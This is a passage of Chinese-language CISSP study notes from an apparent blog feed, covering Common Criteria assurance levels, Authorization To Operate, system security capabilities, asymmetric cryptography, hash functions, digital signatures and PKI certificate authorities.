产品的评估符合一致的高标准</li><li>推广评估并提高已评估和评级 IT 产品的可用性</li><li>评估受评对象（TOE）的功能和保证（可信程度）</li></ul><h3 id="“通用准则”CC-进程基于的元素"><a href="#“通用准则”CC-进程基于的元素" class="headerlink" title="“通用准则”CC 进程基于的元素"></a>“通用准则”CC 进程基于的元素</h3><h4 id="保护轮廓-PP"><a href="#保护轮廓-PP" class="headerlink" title="保护轮廓 PP"></a>保护轮廓 PP</h4><p>保护轮廓（protection profile，PP）为接受评估的产品规定了安全要求和保护措施，</p><p>保护轮廓 PP，也可以视为客户的安全期望。</p><h4 id="安全目标-ST"><a href="#安全目标-ST" class="headerlink" title="安全目标 ST"></a>安全目标 ST</h4><p>安全目标（security targets，ST）规定了应该被供应商纳入受评估对象的安全性能。</p><p>安全目标 ST 可以视为已经执行的安全措施或将要提供的安全措施。</p><p><strong>寻求 PP 与  ST 最接近或匹配度最好的产品</strong></p><p>评估保证级别（evaluation assurance level，EAL）</p><p>EAL 存在 7 个级别，数字越大，级别越高</p><table><thead><tr><th>级别</th><th>保证（可信度）级别</th><th>描述</th></tr></thead><tbody><tr><td>EAL1</td><td>功能测试</td><td>适用于对正常运行的可信度有一定要求，但安全威胁并不严重的情况。在保护个人信息方面，当需要对应尽关心的执行做出独立保证时，不妨用这个级别。</td></tr><tr><td>EAL2</td><td>结构测试</td><td>适用于依照良好商业实践规范交付设计信息和测试结果的情况。当开发人员或用户要求得到<strong>低到中等级别</strong>且有独立保证的安全性时，这个级别适用。该级别特别适用于评估旧系统。</td></tr><tr><td>EAL3</td><td>系统性测试和检查</td><td>适用于安全工程始于设计阶段且始终没有实质性更改的情况。当开发人员或用户要求得到<strong>中等级别</strong>且有独立保证的安全性时，这个级别适用</td></tr><tr><td>EAL4</td><td>系统性设计、测试和审查</td><td>适用于使用严格、主动安全工程和良好商业开发实践规范的情况。这个级别不需要大量专业知识、技能和资源。涉及对受评估对象所有安全功能的独立测试。</td></tr><tr><td>EAL5</td><td>半正式设计和测试</td><td>根据严格的安全工程和商业开发实践规范（包括专业安全工程技术）进行半正式测试。适用于开发人员或用户在规划开发方法以及严格开发的过程中要求得到<strong>高级别</strong>且有独立保证的安全性的情况</td></tr><tr><td>EAL6</td><td>半正式验证、设计和测试</td><td>在设计、开发和测试的所有阶段借助直接、严格的安全工程技术生产优质的受评估对象。适用于需要面对高风险情况的受评估对象，其中受保护资产的价值值得为其增加成本。大范围测试可以降低被渗透的风险、存在隐蔽信道的可能性以及面对攻击的脆弱性。</td></tr><tr><td>EAL7</td><td>正式验证、设计和测试</td><td>只用于最高风险情况或涉及高价值资产的情况。仅适用于被严格要求的安全功能必须接受大范围正式分析和测试的受评估对象。</td></tr></tbody></table><p>通用准则 CC  指南是进行安全评级的<strong>部分</strong>最佳技术。</p><p>CC 不能确保对数据操作方式是安全的。</p><p>CC 没有解决管理问题</p><p>CC 不包括现场安全评估，也就是物理安全相关控制</p><p>CC 不涉及对电磁辐射的控制</p><p>CC 没有明确规定密码算法强度进行评级的标准</p><h2 id="8-4-2-操作授权-ATO"><a href="#8-4-2-操作授权-ATO" class="headerlink" title="8.4.2 操作授权 ATO"></a>8.4.2 操作授权 ATO</h2><p>必须得到正式批准才能将有安全保障的设备用于 IT 操作目的，也就是操作授权（Authorization To Operate，ATO）。</p><p>操作授权 ATO 是风险管理框架（RMF）定义的一个概念的当前说法，取代了以前使用的“认证”。</p><p>操作授权的评估和分配由授权官员（Authorizing Official，AO）负责执行。</p><p>DAA 被指定的批准机构</p><p>AA 批准机构</p><p>SCA 安全控制评估员</p><p>RO 推荐官</p><p><strong>操作授权的有效期通常为 5  年</strong>，可以调整时间期限。</p><h3 id="导致操作授权重新申请的情况"><a href="#导致操作授权重新申请的情况" class="headerlink" title="导致操作授权重新申请的情况"></a>导致操作授权重新申请的情况</h3><ul><li>操作授权的时间期限到期</li><li>系统遭遇严重安全事件</li><li>系统发生重大安全变化</li></ul><h3 id="授权官员可以作出-4-种授权决定"><a href="#授权官员可以作出-4-种授权决定" class="headerlink" title="授权官员可以作出 4 种授权决定"></a>授权官员可以作出 4 种授权决定</h3><h4 id="操作授权"><a href="#操作授权" class="headerlink" title="操作授权"></a>操作授权</h4><p>当组织对风险的管理达到可接受水平，授权官员做出操作授权决定。</p><h4 id="通用控制授权"><a href="#通用控制授权" class="headerlink" title="通用控制授权"></a>通用控制授权</h4><p>当安全控制继承自另一家供应商，且与通用控制CC相关的风险处于可接受水平并已从同一位授权官员处得到了操作授权时。</p><h4 id="使用授权"><a href="#使用授权" class="headerlink" title="使用授权"></a>使用授权</h4><p>当一家第三方供应商（例如云）提供的 IT&#x2F;IS 服务器被认为达到可接受风险水平时。</p><p>使用授权决定可以用来接受另一授权官员的操作授权。</p><h4 id="拒绝授权"><a href="#拒绝授权" class="headerlink" title="拒绝授权"></a>拒绝授权</h4><p>当风险不可接受时</p><h1 id="8-5-理解信息系统的安全能力"><a href="#8-5-理解信息系统的安全能力" class="headerlink" title="8.5 理解信息系统的安全能力"></a>8.5 理解信息系统的安全能力</h1><h2 id="8-5-1-内存保护"><a href="#8-5-1-内存保护" class="headerlink" title="8.5.1 内存保护"></a>8.5.1 内存保护</h2><p>执行内存保护是必须的。</p><p>内存保护目的：</p><p>防止活动进程与并非专门指派或分配的内存区域交互。</p><p>内存保护措施：</p><p>隔离</p><p>虚拟内存</p><p>分段</p><p>内存管理</p><p>保护环</p><p>缓冲区（即内存）溢出保护</p><h2 id="8-5-2-虚拟化"><a href="#8-5-2-虚拟化" class="headerlink" title="8.5.2 虚拟化"></a>8.5.2 虚拟化</h2><p>虚拟化技术用于在一台主机的内存中运行一个或多个操作系统，或者运行与主机操作系统不兼容的应用程序。</p><p>虚拟化是隔离操作系统，测试可疑软件或执行其他安全保护机制的一种工具。</p><h2 id="8-5-3-可信平台模块-TPM"><a href="#8-5-3-可信平台模块-TPM" class="headerlink" title="8.5.3 可信平台模块 TPM"></a>8.5.3 可信平台模块 TPM</h2><p>可信平台模块（Trusted Platform Module，TPM）</p><p>TPM 是主板上密码处理器芯片的规范，也是规范执行方案的称谓。</p><p><strong>TPM 可以用于执行基于密码的安全保护机制。</strong></p><p>TPM 芯片通常用于硬件支持的或操作系统执行的本地存储设备加密系统存储和处理密码密钥。</p><p>硬件安全模块（HSM）是 TPM 的实例。</p><p>HSM 是一种密码处理器，管理&#x2F;存储数字加密密钥，提升密码运算速度，支持数字签名，改进身份认证。</p><p>HSM 可以是主板上的芯片，也可以是扩展卡。</p><p>HSM 包含防篡改保护机制。</p><h2 id="8-5-4-接口"><a href="#8-5-4-接口" class="headerlink" title="8.5.4 接口"></a>8.5.4 接口</h2><p>受约束或受限制接口（constrained  or  restricted interface ）在应用程序内执行，目的是使用户只能按照自己的权限执行操作或查看数据。</p><p>完全权限用户访问所有功能，有限权限用户访问有限功能。</p><p>应用程序约束接口方法：</p><ul><li>用户无权使用的功能隐藏起来</li><li>用户无权使用的功能禁用</li></ul><p>受约束接口使用的是 Clark-Wilson 安全模型的一种实际执行方式。</p><h2 id="8-5-5-容错"><a href="#8-5-5-容错" class="headerlink" title="8.5.5 容错"></a>8.5.5 容错</h2><p>容错（fault tolerance）是指系统虽然发生故障，但仍能继续运行的能力。</p><p>添加冗余组件。</p><p>容错是安全设计的基本要素。</p><h2 id="8-5-6-加密-解密"><a href="#8-5-6-加密-解密" class="headerlink" title="8.5.6 加密&#x2F;解密"></a>8.5.6 加密&#x2F;解密</h2><p>加密是指把明文转换成密文的过程。</p><p>解密是加密过程的反向过程。</p><h1 id="8-6-本章小节"><a href="#8-6-本章小节" class="headerlink" title="8.6 本章小节"></a>8.6 本章小节</h1><h1 id="8-7-考试要点"><a href="#8-7-考试要点" class="headerlink" title="8.7 考试要点"></a>8.7 考试要点</h1><h2 id="能够从访问的角度定义客体和主体"><a href="#能够从访问的角度定义客体和主体" class="headerlink" title="能够从访问的角度定义客体和主体"></a>能够从访问的角度定义客体和主体</h2><p>主体是指对资源提出访问请求的用户或进程。</p><p>客体是指用户或进程想要访问的资源。</p><h2 id="能够描述开放和封闭系统"><a href="#能够描述开放和封闭系统" class="headerlink" title="能够描述开放和封闭系统"></a>能够描述开放和封闭系统</h2><p>开放系统采用行业标准设计，通常易于和别的开放系统集成。</p><p>封闭系统通常由专有硬件和软件组成，规范不公开，通常比较难和其他系统集成。</p><h2 id="了解开源和闭源"><a href="#了解开源和闭源" class="headerlink" title="了解开源和闭源"></a>了解开源和闭源</h2><p>开源解决方案是指源代码和其他内部逻辑都对外公开的解决方案。</p><p>闭源解决方案是指源代码和其他内部逻辑都对外保密的解决方案。</p><h2 id="知道什么是默认安全配置"><a href="#知道什么是默认安全配置" class="headerlink" title="知道什么是默认安全配置"></a>知道什么是默认安全配置</h2><p>永远都不要假设任何产品的默认设定是安全的。</p><p>在任何情况下都应要求系统管理员和公司安全人员依照本单位安全策略更改产品设定。</p><h2 id="了解安全失效概念"><a href="#了解安全失效概念" class="headerlink" title="了解安全失效概念"></a>了解安全失效概念</h2><p>故障管理包括编程错误处理（即异常处理）和输入清理；</p><p>应该把安全失效性能（失效保障与失效安全）集成进系统。</p><h2 id="知道什么是“保持简单”原则"><a href="#知道什么是“保持简单”原则" class="headerlink" title="知道什么是“保持简单”原则"></a>知道什么是“保持简单”原则</h2><p>“保持简单”是指应该避免环境、机构或产品被设计得过于复杂。</p><p>系统越复杂，就越难以保证安全。</p><h2 id="了解零信任"><a href="#了解零信任" class="headerlink" title="了解零信任"></a>了解零信任</h2><p>不应该对机构内部的任何东西自动给以信任。</p><p>绝不信任，永远验证。</p><p>零信任模型基于“假设违规”和微分网段。</p><h2 id="知道什么是通过设计保持隐私"><a href="#知道什么是通过设计保持隐私" class="headerlink" title="知道什么是通过设计保持隐私"></a>知道什么是通过设计保持隐私</h2><p>通过设计保护隐私（PbD）原则是说，在产品设计阶段就把隐私保护机制集成进产品。</p><p>而不是在产品开发结束后再尝试添加。</p><p>PbD 框架基于 7 个基本原则。</p><h2 id="了解“信任但要验证”"><a href="#了解“信任但要验证”" class="headerlink" title="了解“信任但要验证”"></a>了解“信任但要验证”</h2><p>“信任但要验证”是指自动信任公司安全边界内的主体和设备的一种传统安全保护方法。</p><p>“信任但要验证”安全保护方法不仅使组织容易遭受内部人员攻击，而且会使入侵者能在内部系统之间轻松横向移动。</p><h2 id="知道什么是限定、界限和隔离"><a href="#知道什么是限定、界限和隔离" class="headerlink" title="知道什么是限定、界限和隔离"></a>知道什么是限定、界限和隔离</h2><p>限定制约进程对某些内存位置的读和写。</p><p><strong>界定是能不能的问题</strong></p><p>界限是进程在读或写时不能超过的内存限制范围。</p><p><strong>界限是哪到哪的问题</strong></p><p>隔离是通过内存界限把进程限定在限制范围内允许的一种模式。</p><h2 id="了解安全控制的工作原理及功能"><a href="#了解安全控制的工作原理及功能" class="headerlink" title="了解安全控制的工作原理及功能"></a>了解安全控制的工作原理及功能</h2><p>安全控制通过访问规则限制主体对客体的访问。</p><h2 id="了解信任和保证"><a href="#了解信任和保证" class="headerlink" title="了解信任和保证"></a>了解信任和保证</h2><p>可信任的系统是指所有保护机制协同工作，为多种类型用户处理敏感数据，同时使计算机环境保持稳定和安全的系统。</p><p>信任是安全机制或能力的体现。</p><p>保证是满足安全需求的可信程度。</p><p>保证表明了安全机制在提供安全保护方面究竟有多可靠。</p><h2 id="定义可信计算基（TCB）"><a href="#定义可信计算基（TCB）" class="headerlink" title="定义可信计算基（TCB）"></a>定义可信计算基（TCB）</h2><p>TCB 是硬件、软件和控制的组合，为安全策略的执行构成了一个可信基础。</p><h2 id="能够解释安全边界"><a href="#能够解释安全边界" class="headerlink" title="能够解释安全边界"></a>能够解释安全边界</h2><p>安全边界是将 TCB 与系统其他部分分隔开的假想边界。</p><p>TCB 组件通过可信路径与非 TCB 组件通信。</p><h2 id="掌握每种访问控制模型的细节"><a href="#掌握每种访问控制模型的细节" class="headerlink" title="掌握每种访问控制模型的细节"></a>掌握每种访问控制模型的细节</h2><p>了解访问控制模型和它们的功能。</p><p><strong>状态机模型</strong>：确保访问客体的所有主体实例都是安全的。</p><p><strong>信息流模型</strong>：经设计可阻止未经授权、不安全或受限制的信息流。</p><p><strong>无干扰模型</strong>：防止一个主体的动作影响另一个主体的系统状态或动作。</p><p><strong>获取-授予模型</strong>：规定了权限可以怎样从一个主体传递给另一个主体或从一个主体传递给一个客体。</p><p><strong>访问控制矩阵</strong>：一个由主体和客体组成的表格，表明了每个主体可以对每个客体执行的操作或功能。</p><p><strong>Bell-LaPadula 模型</strong>：主体具有的权限级别使其只能访问具有相应涉密级别的客体，从而实现对保密性的保护。</p><p><strong>Biba 模型</strong>：防止安全级别较低的主体对安全级别较高的客体执行写操作。</p><p><strong>Clark-Wilson 模型</strong>：一种依赖访问控制三元组（即主体&#x2F;程序&#x2F;客体）的完整性模型。</p><p><strong>Goguen-Meseguer 模型</strong>：与 Sutherland 模型专注于完整性。</p><p><strong>Graham-Denning 模型</strong>：专注于主体和客体的安全创建和删除。</p><p><strong>Harrison-Ruzzo-Ullman（HRU）模型</strong>：　专注于给主体分配客体的访问权限以及这些被分配权限的完整性（或韧性）。</p><p><strong>“通用准则”（ISO&#x2F;IEC 15408）</strong>：一种主观性安全功能评估工具，可根据保护轮廓（PP）和安全目标（ST）分配评估保证级别（EAL）。</p><p><strong>操作授权</strong>：（来自 RMF）一种用于运行 IT&#x2F;IS 的正式授权，以一组既定的安全和隐私控制为基础，以可接受的风险水平为依据。</p><h2 id="了解信息系统的安全能力"><a href="#了解信息系统的安全能力" class="headerlink" title="了解信息系统的安全能力"></a>了解信息系统的安全能力</h2><p>常见的安全能力包括内存保护、虚拟化和可信平台模块（TPM）、加密&#x2F;解密、接口和容错。</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>seccert</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>seccert</tag>
      
      <tag>cissp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>7-域3安全架构与工程-PKI和密码应用</title>
    <link href="/2025/05/30/security/seccert/cissp/7-%E5%9F%9F3%E5%AE%89%E5%85%A8%E6%9E%B6%E6%9E%84%E4%B8%8E%E5%B7%A5%E7%A8%8B-PKI%E5%92%8C%E5%AF%86%E7%A0%81%E5%BA%94%E7%94%A8/"/>
    <url>/2025/05/30/security/seccert/cissp/7-%E5%9F%9F3%E5%AE%89%E5%85%A8%E6%9E%B6%E6%9E%84%E4%B8%8E%E5%B7%A5%E7%A8%8B-PKI%E5%92%8C%E5%AF%86%E7%A0%81%E5%BA%94%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="7-1-非对称密码"><a href="#7-1-非对称密码" class="headerlink" title="7.1 非对称密码"></a>7.1 非对称密码</h1><h2 id="7-1-1-公钥和私钥"><a href="#7-1-1-公钥和私钥" class="headerlink" title="7.1.1 公钥和私钥"></a>7.1.1 公钥和私钥</h2><p>公钥密码系统（public key cryptosystem）给每个用户都分配一对密钥：一个公钥和一个私钥。</p><p>公钥用于加密，私钥用于解密。</p><p>公钥系统适用的密钥必须要比私钥系统所用的密钥更长。</p><h2 id="7-1-2-RSA"><a href="#7-1-2-RSA" class="headerlink" title="7.1.2 RSA"></a>7.1.2 RSA</h2><p>1977 年 RSA 公钥算法（RSA public key algorithm）。</p><p>算法原理：</p><p>因式分解大素数乘积</p><p>公私钥生成步骤：</p><p>1、选择两个大素数（每个都约为 200 位），用 p  和 q  表示</p><p>2、计算这两个数的乘积：n &#x3D; p*q</p><p>3、挑选一个满足以下两项要求的数 e</p><ul><li>e 小于 n</li><li>e 和 (p-1)(q-1)是互素的–这两个数没有除了 1 以外的公因数</li></ul><p>4、找到一个数 d ，使 ed &#x3D; 1 mod ((p-1)(q-1))</p><p>5、把 e 和 n 作为公钥分发给密码系统的所有用户。d 作为私钥保密。</p><h3 id="Merkle-Hellman-背包算法"><a href="#Merkle-Hellman-背包算法" class="headerlink" title="Merkle - Hellman 背包算法"></a>Merkle - Hellman 背包算法</h3><p>也基于进行因式分解运算。</p><p>1984 年被破解。</p><h3 id="密钥长度的重要性"><a href="#密钥长度的重要性" class="headerlink" title="密钥长度的重要性"></a>密钥长度的重要性</h3><p>数据越关键，保护数据的密钥需要更强。</p><p>密钥破解能力随着时间增强，所以数据需要保护的时间越久，保护数据的密钥就需要越强。</p><h2 id="7-1-3-EIGamal-算法"><a href="#7-1-3-EIGamal-算法" class="headerlink" title="7.1.3 EIGamal 算法"></a>7.1.3 EIGamal 算法</h2><p>EIGamal 算法优势：</p><p>算法公开免费，RSA 2000年才公开算法</p><p>EIGamal 算法劣势：</p><p>加密的任何信息都被加长了一倍，网络传输困难。</p><h2 id="7-1-4-椭圆曲线"><a href="#7-1-4-椭圆曲线" class="headerlink" title="7.1.4 椭圆曲线"></a>7.1.4 椭圆曲线</h2><p>1985 年提出理念，椭圆曲线密码（elliptic curve cryptography，ECC）投入实际使用。</p><p>椭圆曲线定义：</p><p>y的平方 &#x3D; x的3次方 + ax + b</p><p>x y a b 都是实数。</p><p>每条椭圆曲线都有一个响应的椭圆曲线群（elliptic curve group），由椭圆曲线上的点和位于无限远的点 O 组成。</p><p>可以使用一种椭圆曲线加法算法将同一个椭圆曲线群内的两个点 P 和 Q 相加，表达式如下：</p><p>P + Q</p><p>如果设 Q 是 P 的倍数，可以扩展这道题以引入乘法，表达式如下：</p><p>Q &#x3D; xP </p><p>即使 P 和 Q 是已知的，也极难算出 x 。</p><p>业界广泛认为，相比于 RSA 以及 Diffie-Hellman 和 ElGamal ，椭圆曲线更难。</p><h2 id="7-1-5-Diffie-Hellman-密钥交换"><a href="#7-1-5-Diffie-Hellman-密钥交换" class="headerlink" title="7.1.5 Diffie-Hellman 密钥交换"></a>7.1.5 Diffie-Hellman 密钥交换</h2><p>Diffie-Hellman算法是由素数数学原理支撑的。</p><h3 id="算法步骤"><a href="#算法步骤" class="headerlink" title="算法步骤"></a>算法步骤</h3><p>(1) Richard 和 Sue 商定采用两个大数：一个素数 p 和一个整数 g, 同时设 1&lt;g&lt;p 。</p><p>(2) Richard 挑选了一个大随机整数 r 并进行以下计算：</p><p>R&#x3D;g 的 r 次方 mod p</p><p>(3) Sue 挑选了一个大随机整数 s 并进行以下计算：</p><p>S&#x3D;g 的 s 次方 mod p</p><p>(4) Richard 把 R 发送给 Sue, 而 Sue 把 S 发送给 Richard 。</p><p>(5) Richard 随后进行以下计算：</p><p>K&#x3D;S 的 r 次方  mod p</p><p>(6) Sue 随后进行以下计算：</p><p>K&#x3D;R 的 s 次方 mod p</p><p>Diffie-Hellman 本身不是加密协议，属于密钥交换协议。</p><p>常被用于为传输层安全（TLS）的使用创建共享秘密密钥。</p><p>Diffie-Hellman 密钥交换算法依赖于大素数的使用。</p><p>ECDHE 密钥交换算法是 Diffie-Hellman 方法的变体，用椭圆曲线问题来执行类似的密钥商定过程。</p><h2 id="7-1-6-量子密码"><a href="#7-1-6-量子密码" class="headerlink" title="7.1.6 量子密码"></a>7.1.6 量子密码</h2><p>量子计算（quantum computing）</p><p>量子计算理论：</p><p>用名为 “量子比特”（qubit）的多维量子位取代数字计算的二进制 1 和 0 位。</p><p>量子霸权（quantum supremacy），将会导致现有的非对称加密算法 RSA、Diffie-Hellman 不再安全。</p><p>量子密码（quantum cryptography）系统，创建更新、更复杂的密码算法。</p><p>量子密钥分发（quantum key distribution，OKD）执行方案，借助量子计算在两个用户之间创建共享秘密密钥。</p><p>对数据的加密需要考虑到量子世界的安全性。</p><h1 id="7-2-哈希函数-hash-function"><a href="#7-2-哈希函数-hash-function" class="headerlink" title="7.2 哈希函数 hash function"></a>7.2 哈希函数 hash function</h1><h3 id="数字签名"><a href="#数字签名" class="headerlink" title="数字签名"></a>数字签名</h3><p>证明一条消息来自秘密系统中的某一个特定的用户，同时确保消息在双方之间传递的过程中未曾有过改动。</p><h3 id="哈希函数目的"><a href="#哈希函数目的" class="headerlink" title="哈希函数目的"></a>哈希函数目的</h3><p>提取一条可能会比较长的消息，然后从消息内容中派生一个唯一的输出值，也就是消息摘要（message digest）。</p><h3 id="消息摘要"><a href="#消息摘要" class="headerlink" title="消息摘要"></a>消息摘要</h3><p>消息摘要由消息的发送者生成，并和整个消息一起发送给接收者。原因如下</p><ul><li>接收者用同一个哈希函数根据整条消息重算消息摘要，消息必须完全相同，摘要才可能匹配。</li><li>消息摘要可以用来执行数字签名算法。</li></ul><p>消息摘要一般为 128 位或更长。</p><p>消息摘要越长，完整性检验越可靠。</p><h3 id="密码哈希函数基本要求"><a href="#密码哈希函数基本要求" class="headerlink" title="密码哈希函数基本要求"></a>密码哈希函数基本要求</h3><p>哈希函数创建一个值，值是唯一的，不可以被逆向推算或“反哈希化运算”</p><ul><li>输入可以是任何长度</li><li>输出有一个固定长度</li><li>哈希函数的计算对任何输入而言都相对容易</li><li>哈希函数是单向的</li><li>哈希函数抗碰撞，不会有产生相同哈希值的消息</li></ul><h3 id="需要知道的哈希算法"><a href="#需要知道的哈希算法" class="headerlink" title="需要知道的哈希算法"></a>需要知道的哈希算法</h3><p>安全哈希算法（SHA）</p><p>消息摘要5（MD5）</p><p>RIPE消息摘要（RIPEMD）</p><p>消息身份认证码（HMAC）</p><p>可变长度哈希（HAVAL）</p><h2 id="7-2-1-SHA"><a href="#7-2-1-SHA" class="headerlink" title="7.2.1 SHA"></a>7.2.1 SHA</h2><p>“安全哈希算法”（SHA）及其后继算法 SHA-1、SHA-2 和 SHA-3</p><h3 id="SHA-1-已弃用"><a href="#SHA-1-已弃用" class="headerlink" title="SHA-1 已弃用"></a>SHA-1 已弃用</h3><p>可以提取任何长度的输入</p><p>生成 160 位消息摘要</p><p>处理 512 位块消息</p><p>如果消息长度不足 512 ，使用附加数据填充消息，确保消息长度为 512 倍数</p><h3 id="SHA-2"><a href="#SHA-2" class="headerlink" title="SHA-2"></a>SHA-2</h3><p>SHA-1 替代品</p><h4 id="SHA-2-变体"><a href="#SHA-2-变体" class="headerlink" title="SHA-2 变体"></a>SHA-2 变体</h4><ul><li>SHA-256：用 512 位块大小生成 256 位消息摘要</li><li>SHA-224：用 512 位块大小生成 224 位消息摘要</li><li>SHA-512：用 1024 位块大小生成 512 位消息摘要</li><li>SHA-384：用 1024 位块大小生成 384 位消息摘要</li></ul><h3 id="SHA-3"><a href="#SHA-3" class="headerlink" title="SHA-3"></a>SHA-3</h3><p>Keccak 算法定为 SHA-3 标准</p><p>SHA-3 通过一种不同的算法提供与 SHA-2 相同变体和哈希长度</p><p>SHA-3 可以提供与 SHA-2 相同的安全强度，但是速度比 SHA-2 慢</p><p>可以在硬件中执行，但是使用率不高。</p><h2 id="7-2-2-MD5-消息摘要5"><a href="#7-2-2-MD5-消息摘要5" class="headerlink" title="7.2.2 MD5 消息摘要5"></a>7.2.2 MD5 消息摘要5</h2><h3 id="MD2-消息摘要2"><a href="#MD2-消息摘要2" class="headerlink" title="MD2 消息摘要2"></a>MD2 消息摘要2</h3><p>1989年开发</p><p>为 8  位处理器提供安全哈希函数</p><h3 id="MD4-消息摘要4"><a href="#MD4-消息摘要4" class="headerlink" title="MD4 消息摘要4"></a>MD4 消息摘要4</h3><p>1991年</p><p>MD2 的强化版本，支持 32 位处理器，并提高了安全强度。</p><h3 id="MD5-消息摘要5"><a href="#MD5-消息摘要5" class="headerlink" title="MD5 消息摘要5"></a>MD5 消息摘要5</h3><p>处理 512 位消息块</p><p>4 轮不同计算生成一个长度和 MD2 和 MD4 算法相同的摘要（128位）</p><p>消息长度必须比 512 位的倍数小 64 位</p><h2 id="7-2-3-RIPEMD-RIPE消息摘要"><a href="#7-2-3-RIPEMD-RIPE消息摘要" class="headerlink" title="7.2.3 RIPEMD RIPE消息摘要"></a>7.2.3 RIPEMD RIPE消息摘要</h2><p>RIPE 消息摘要（RIPEMD）系列哈希函数是 SHA 系列的替代方案</p><h3 id="包含的函数"><a href="#包含的函数" class="headerlink" title="包含的函数"></a>包含的函数</h3><ul><li>RIPEMD 生成 128 位摘要，并存在结构化缺陷，不安全</li><li>RIPEMD-128 取代 RIPEMD，生成 128 位摘要，不安全</li><li>RIPEMD-160 取代 TIPEMD-128，生成 160 位哈希值，目前认为安全</li></ul><p>安全强度来看：<br>RIPEMD-128 和 RIPEMD-256 相同，不安全</p><p>RIPEMD-160 和 RIPEMD-320相同，安全</p><h2 id="🌟7-2-4-各种哈希算法哈希值长度比较"><a href="#🌟7-2-4-各种哈希算法哈希值长度比较" class="headerlink" title="🌟7.2.4 各种哈希算法哈希值长度比较"></a>🌟7.2.4 各种哈希算法哈希值长度比较</h2><p>哈希算法记忆表</p><table><thead><tr><th>名称</th><th>哈希值长度</th><th>描述</th></tr></thead><tbody><tr><td>HAVAL</td><td>128、160、192、224 和 256</td><td>可变哈希长度</td></tr><tr><td>HMAC</td><td>可变</td><td>消息身份认证码</td></tr><tr><td>MD5</td><td>128 位</td><td>消息摘要5</td></tr><tr><td>SHA-1</td><td>160 位</td><td>安全哈希算法1</td></tr><tr><td>SHA2-224&#x2F;SHA3-224</td><td>224 位</td><td>安全哈希算法2&#x2F;3</td></tr><tr><td>SHA2-256&#x2F;SHA3-256</td><td>256 位</td><td>安全哈希算法2&#x2F;3</td></tr><tr><td>SHA2-384&#x2F;SHA3-384</td><td>384 位</td><td>安全哈希算法2&#x2F;3</td></tr><tr><td>SHA2-512&#x2F;SHA3-512</td><td>512 位</td><td>安全哈希算法2&#x2F;3</td></tr><tr><td>RIPEMD-128</td><td>128 位</td><td></td></tr><tr><td>RIPEMD-160</td><td>160 位</td><td></td></tr><tr><td>RIPEMD-256</td><td>256 位，安全强度等价于 RIPEMD 128 位</td><td></td></tr><tr><td>RIPEMD-320</td><td>320 位，安全强度等价于 RIPEMD 160 位</td><td></td></tr></tbody></table><h1 id="7-3-数字签名"><a href="#7-3-数字签名" class="headerlink" title="7.3 数字签名"></a>7.3 数字签名</h1><p>数字签名 digital signature</p><h3 id="数据签名目的"><a href="#数据签名目的" class="headerlink" title="数据签名目的"></a>数据签名目的</h3><ul><li>有数字签名的消息可以向接受者保证，消息确实来自声称的发送者。还可以提供不可否认性保障</li><li>有数字签名的消息可以向接受者保证，消息在传送过程中不曾改动过，可以抵御恶意篡改和无意改动</li></ul><h3 id="消息签名用途"><a href="#消息签名用途" class="headerlink" title="消息签名用途"></a>消息签名用途</h3><ul><li>消息验证</li><li>互联网下载代码鉴别</li></ul><h3 id="数字签名注意点"><a href="#数字签名注意点" class="headerlink" title="数字签名注意点"></a>数字签名注意点</h3><p>数字签名流程不为消息具体内容和签名本身提供保密性保护，只为密码的完整性、身份认证和不可否认性目标。</p><h2 id="7-3-1-HMAC"><a href="#7-3-1-HMAC" class="headerlink" title="7.3.1 HMAC"></a>7.3.1 HMAC</h2><p>基于哈希的消息身份认证码（HMAC）算法</p><p>保证消息在传输过程中的完整性，但不提供不可否认性服务。</p><p>依靠共享秘密密钥</p><h2 id="7-3-2-数字签名标准"><a href="#7-3-2-数字签名标准" class="headerlink" title="7.3.2 数字签名标准"></a>7.3.2 数字签名标准</h2><p>NIST 通过 “数字签名标准”（DSS）规定联邦政府使用的数字签名都必须使用 SHA-3 哈希函数。</p><p>DSS 规定支持数字签名的加密算法，三种：</p><ul><li>数字签名算法（DSA）</li><li>RSA 算法</li><li>椭圆曲线 DSA（ECDSA）</li></ul><h3 id="密钥使用策略"><a href="#密钥使用策略" class="headerlink" title="密钥使用策略"></a>密钥使用策略</h3><ul><li>加密消息，使用接收者公钥</li><li>解密消息，使用自己的私钥</li><li>发送消息加数字签名，使用自己的私钥</li><li>验证消息的数字签名，使用发送者的公钥</li></ul><h1 id="7-4-公钥基础设施"><a href="#7-4-公钥基础设施" class="headerlink" title="7.4 公钥基础设施"></a>7.4 公钥基础设施</h1><p>公钥加密优势：</p><p>通过公钥基础设施（public key infrastructure，PKI）信息关系层级体系实现不相识的双方进行通信。</p><h2 id="7-4-1-证书"><a href="#7-4-1-证书" class="headerlink" title="7.4.1 证书"></a>7.4.1 证书</h2><p>数字证书（certificate）向通行双方保证，与之通信的确实是他们声称的人。</p><p>数字证书包含具体识别信息，构成受国际标准 X.509 辖制</p><p>证书包含内容：</p><ul><li>证书遵守的 X.509 版本</li><li>序号（证书创建者编制）</li><li>签名算法标识符</li><li>发证者名称</li><li>有效期</li><li>主体名称</li><li>主体公钥（主要内容）</li></ul><p>证书可为各种目的签发，包括以下对象的公钥：</p><ul><li>计算机&#x2F;机器</li><li>个人用户</li><li>电子邮件地址</li><li>开发者（代码签名的证书）</li></ul><p>证书主体可能包括证书名通配符，表明证书适用于子域名，通配符用星号表示，通配符证书只适用于一层子域。</p><h2 id="7-4-2-发证机构-CA"><a href="#7-4-2-发证机构-CA" class="headerlink" title="7.4.2 发证机构 CA"></a>7.4.2 发证机构 CA</h2><p>发证机构（certificate authority，CA）是将公钥基础设施结合到一起的粘合剂。</p><p>中立机构提供数字证书公证服务。</p><h3 id="常见-CA"><a href="#常见-CA" class="headerlink" title="常见 CA"></a>常见 CA</h3><p>Symantec</p><p>IdenTrust</p><p>Amanzon Web Services</p><p>GlobalSign</p><p>Comodo</p><p>Certum</p><p>GoDaddy</p><p>DigiCert</p><p>Secom</p><p>Entrust</p><p>Actalis</p><p>Trustwave</p><h3 id="注册机构-RA"><a href="#注册机构-RA" class="headerlink" title="注册机构 RA"></a>注册机构 RA</h3><p>注册机构（registration authority，RA）分担 CA 签发数字证书前验证用户身份的工作。</p><p>不直接签发证书，使 CA 能够远程验证用户身份。</p><h3 id="CA-信任链"><a href="#CA-信任链" class="headerlink" title="CA 信任链"></a>CA 